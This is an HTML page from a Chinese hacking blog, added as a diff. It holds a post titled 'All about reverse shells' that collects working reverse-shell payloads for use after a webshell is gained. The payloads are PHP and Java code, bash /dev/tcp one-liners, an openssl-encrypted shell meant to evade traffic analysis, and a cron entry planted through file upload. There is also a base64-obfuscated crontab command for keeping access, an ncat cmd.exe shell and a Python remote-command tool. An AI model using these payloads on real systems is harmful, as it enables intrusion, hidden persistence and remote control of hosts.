@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#6c599f">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/./images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/./images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/./images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/./images/safari-pinned-tab-next.svg" color="#6c599f">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=EB Garamond, Noto Serif SC:300,300italic,400,400italic,700,700italic|Long Cang:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"localhost","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="众所周知的反弹shell我们拿到webshell后如果想进一步搞事情，那么肯定绕不过反弹shell。即使有蚁剑，菜刀这样的神器，但是非交互式的shell仍有很多不好用的地方。先说反弹shell吧，反弹shell的方法很多，各个语言有各个语言的方式，这里不是为了介绍这些的，当然还是贴一个大佬朋友的博客&gt;点击这里&lt;，你们可以去上面看看他的总结。另外，补充一个现实非常好用的php反弹shel">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于反弹shell的那些事">
+<meta property="og:url" content="http://localhost:4000/posts/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/">
+<meta property="og:site_name" content="匆匆那年">
+<meta property="og:description" content="众所周知的反弹shell我们拿到webshell后如果想进一步搞事情，那么肯定绕不过反弹shell。即使有蚁剑，菜刀这样的神器，但是非交互式的shell仍有很多不好用的地方。先说反弹shell吧，反弹shell的方法很多，各个语言有各个语言的方式，这里不是为了介绍这些的，当然还是贴一个大佬朋友的博客&gt;点击这里&lt;，你们可以去上面看看他的总结。另外，补充一个现实非常好用的php反弹shel">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-06-01T04:12:57.000Z">
+<meta property="article:modified_time" content="2022-03-23T07:17:30.781Z">
+<meta property="article:author" content="Geez">
+<meta property="article:tag" content="command excution">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://localhost:4000/posts/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>关于反弹shell的那些事 | 匆匆那年</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">匆匆那年</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">钟声敲在你我耳边</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-fas fa-home"></i>首页</a>
+
+  </li>
+        
+            
+  <li class="menu-item menu-item-overview">
+
+    <a href="/overview/" rel="section"><i class="fa fa-fw fa-fas fa-archive"></i>总览</a>
+
+  </li>
+
+
+      
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-fas fa-location-arrow"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-friends">
+
+    <a href="/friends/" rel="section"><i class="fa fa-fw fa-fas fa-heart"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/posts/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Geez">
+      <meta itemprop="description" content="黑客,诗人,养龟仔">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="匆匆那年">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          关于反弹shell的那些事
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发布：</span>
+
+              <time title="创建时间：2019-06-01 12:12:57" itemprop="dateCreated datePublished" datetime="2019-06-01T12:12:57+08:00">2019-06-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-23 15:17:30" itemprop="dateModified" datetime="2022-03-23T15:17:30+08:00">2022-03-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类：</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/overview/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="众所周知的反弹shell"><a href="#众所周知的反弹shell" class="headerlink" title="众所周知的反弹shell"></a>众所周知的反弹shell</h4><p>我们拿到webshell后如果想进一步搞事情，那么肯定绕不过反弹shell。即使有蚁剑，菜刀这样的神器，但是非交互式的shell仍有很多不好用的地方。<br>先说反弹shell吧，反弹shell的方法很多，各个语言有各个语言的方式，这里不是为了介绍这些的，当然还是贴一个大佬朋友的博客<a target="_blank" rel="noopener" href="https://www.kkzevip.com/?post=21">&gt;点击这里&lt;</a>，你们可以去上面看看他的总结。<br>另外，补充一个现实非常好用的php反弹shell的脚本，可以说我用这个脚本反弹从来没失败过。</p>
+<span id="more"></span>
+<p>代码如下，改好ip+port运行即可：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>);</span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="variable">$sock</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br></pre></td></tr></table></figure>
+<p>真的是比网上的那些php反弹shell（比如：php -r ‘$sock&#x3D;fsockopen(“10.0.0.1”,1234);exec(“&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’）成功率高很多。当然此方法也有限制，限制就是系统没有禁用 proc_popen(默认不禁用)。</p>
+<p>还有网上广泛的java反弹shell，但是在我测试的时候经常是失败的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+<p>上面这种我测试经常是失败的，可能是版本不支持或者写法有问题吧，具体不太清楚。<br>也给大家推荐我常用的java的反弹shell:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// payload1</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">p.waitFor();</span><br><span class="line"></span><br><span class="line"><span class="comment">//payload2</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="加密的反弹shell"><a href="#加密的反弹shell" class="headerlink" title="加密的反弹shell"></a>加密的反弹shell</h4><p>这个是源于看freebuf的一篇文章，后来才知道原来ssl也可以进行反弹shell的加密。这样我们执行的命令流量就不能被分析出来了（在实战中可能有更大的用处，毕竟留痕更少）。</p>
+<ul>
+<li>1 首先，vps上生成SSL证书的公私钥对<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure></li>
+<li>2 在自己的VPS上监听反弹shell<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure></li>
+<li>3 在目标上用openssl加密反弹shell的流量<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkfifo</span> /tmp/s;/bin/bash -i &lt; /tmp/s 2&gt;&amp;1|openssl s_client -quiet -connect vps:443 &gt; /tmp/s;<span class="built_in">rm</span> /tmp/s</span><br></pre></td></tr></table></figure>
+你可以自己去抓包分析，对比加密反弹和常规反弹包，可以很清楚的知道加密的流量包是分析不出来我们执行了那些命令的。而且由于mkfifo 系统大多数系统自带，所以绝大多数都可以使用这种方式来反弹加密的shell流量。</li>
+</ul>
+<h4 id="利用cron的反弹shell"><a href="#利用cron的反弹shell" class="headerlink" title="利用cron的反弹shell"></a>利用cron的反弹shell</h4><p>有时候我们还没拿到webshell，这时也并一定就没法反弹一个shell出来。这里分享一个例子：<br>曾经有次渗透测试java web网站，网站存在任意文件上传，但是上传的jsp无法执行，可能是需要编译部署后才可执行（黑盒，具体原因现在也没搞清），所以需要其他的思路来拿shell，当时就是利用的任意文件上传cron。文件内容就是下面这样：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * bash -i &gt;&amp; /dev/tcp/192.168.2.15/9999  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>当然如果有webshell 也可以用cron反弹shell（维持权限）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo ZWNobyAiKiAqICogKiAqIGJhc2ggLWMgJ3tlY2hvLFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHpPUzR4TURVdU9TNHhMems1T1RrZ01ENG1NUT09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0nIiB8Y3JvbnRhYiAt |base64 -d|bash -i&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>这个姿势还常用于awd中的权限维持，可以写好脚本从靶机直接进行flag的提交。另外对crontab不了解的同学可以去深入学习下crontab的结构和知识（很简单的）。</p>
+<p>有时候在实战中经常发现用webshell进行shell反弹时会出现很多问题，但绝大多数都是编码的问题，这里记录下某次用jsp的命令执行进行的shell 反弹。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="built_in">echo</span>,<span class="built_in">base64</span>&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125; </span><br><span class="line">//这种可以解决编码问题，但是不能忽略<span class="built_in">base64</span>中的 + 号，这个也得编码。</span><br><span class="line"></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,<span class="built_in">base64</span>&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line">//java执行命令的小马一般用上述的反弹那 shell 方式</span><br><span class="line"></span><br><span class="line">bash -c <span class="string">&quot;bash -i .........&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h4><p>上面的都是讲反弹shell，那么反弹shell后怎么拿到一个交互式的shell呢？(ctrl+c断不掉的那种)<br>直接上方法吧（不介绍第三方工具，因为大多数目标环境没有）：</p>
+<ul>
+<li>python实现的弱tty<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;	pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+为什么是一个弱tty呢 因为ctrl+c 仍可以中断，不过已经够用了 vi su 等等命令已经不是问题了。<br>它可以利用socat和nc来实现强tty不过目前感觉没啥用！感兴趣的去看下这篇文章:  <a target="_blank" rel="noopener" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a><br>目前还没发现比这个更好用的交互式shell的利用。以后有了再补充这块吧！</li>
+</ul>
+<h4 id="补充下windows-反弹shell"><a href="#补充下windows-反弹shell" class="headerlink" title="补充下windows 反弹shell"></a>补充下windows 反弹shell</h4><ul>
+<li><ol>
+<li>毫无疑问msf才是最适合windows反弹shell的工具</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>nc <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -e cmd.exe 192.168.174.129 8080</span><br></pre></td></tr></table></figure>
+也挺好用，就是有时候没有nc，自己传也很麻烦还有诸多限制。</li>
+</ol>
+</li>
+<li>3.python<br>有python环境也可以用python来反弹，相当于用python写了一个nc<br>服务端<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">HOST=<span class="string">&#x27;&#x27;</span></span><br><span class="line">PORT=<span class="number">1122</span></span><br><span class="line">BUFSIZ=<span class="number">1024</span></span><br><span class="line">ADDR=(HOST, PORT)</span><br><span class="line">sock=socket(AF_INET, SOCK_STREAM)</span><br><span class="line">sock.bind(ADDR)</span><br><span class="line">sock.listen(<span class="number">1</span>)</span><br><span class="line">STOP_CHAT=<span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> STOP_CHAT:</span><br><span class="line">    tcpClientSock, addr=sock.accept()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Listening.....&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data=tcpClientSock.recv(BUFSIZ)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            tcpClientSock.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        STOP_CHAT=(data.decode(<span class="string">&#x27;utf8&#x27;</span>).upper()==<span class="string">&quot;QUIT&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> STOP_CHAT:</span><br><span class="line">            <span class="comment">#打扫战场 运用linux定时计划任务一分钟后删除当前脚本文件</span></span><br><span class="line">            <span class="comment">#current_file_path =os.getcwd()+sys.argv[0]</span></span><br><span class="line">            <span class="comment">#os.system(&#x27;echo */1　　*　　*　　*　　*　　rm -rf &#x27;+current_file_path+&#x27; &gt;&gt; /etc/crontab&#x27;)</span></span><br><span class="line">            <span class="comment">#tell_hack = &#x27;Will help you clean war...&#x27;</span></span><br><span class="line">            <span class="comment">#tcpClientSock.sendall(tell_hack.encode(&#x27;utf8&#x27;))</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ME = os.popen(data.decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">        os_result = ME.read()</span><br><span class="line">        <span class="built_in">print</span>(os_result)</span><br><span class="line">        tcpClientSock.sendall(os_result.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">tcpClientSock.close()</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+客户端<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TcpClient</span>:</span><br><span class="line">    HOST=<span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">    PORT=<span class="number">1122</span></span><br><span class="line">    BUFSIZ=<span class="number">2048</span></span><br><span class="line">    ADDR=(HOST, PORT)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.client=socket(AF_INET, SOCK_STREAM)</span><br><span class="line">        self.client.connect(self.ADDR)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=<span class="built_in">input</span>(<span class="string">&#x27;OS Shell &gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            self.client.send(data.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Execute %s：%s&#x27;</span> %(self.HOST,data))</span><br><span class="line">            <span class="keyword">if</span> data.upper()==<span class="string">&quot;QUIT&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data=self.client.recv(self.BUFSIZ)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Receive：%s&#x27;</span> %(data.decode(<span class="string">&#x27;utf8&#x27;</span>)))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    client=TcpClient()</span><br></pre></td></tr></table></figure>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4>反弹shell的方法五花八门，最重要的还是找到一个依赖最少的，最稳定的反弹shell的方式。</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+
+<span style="margin-top:30px; color:var(--blockquote-color); font-size:0.85em">
+        <br>
+        <span class="post-end-item" title="copyright"">
+            <span class="post-end-item-icon" style="margin-right: 3px">
+                <i class="fab fa-fw fa-creative-commons"></i>
+            </span>
+            <span class="post-end-item-text">采用署名-非商业性使用-相同方式共享 4.0（CC BY-NC-SA 4.0）许可协议</span>
+        </span>
+</span>
+
+
+
+
+
+<div class="donations">
+    <div class="donation-label">「分享也是一种学习」</div>
+</div>
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/overview/tags/command-excution/" rel="tag"><i class="fa fa-tag"></i> command excution</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/adb%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/" rel="prev" title="adb工具的使用笔记">
+      <i class="fa fa-chevron-left"></i> adb工具的使用笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/MS2019_0708%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/" rel="next" title="MS2019_0708复现笔记">
+      MS2019_0708复现笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%97%E6%89%80%E5%91%A8%E7%9F%A5%E7%9A%84%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">众所周知的反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">加密的反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8cron%E7%9A%84%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">利用cron的反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8Fshell"><span class="nav-text">交互式shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A5%E5%85%85%E4%B8%8Bwindows-%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">补充下windows 反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Geez"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Geez</p>
+  <div class="site-description" itemprop="description">黑客,诗人,养龟仔</div>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
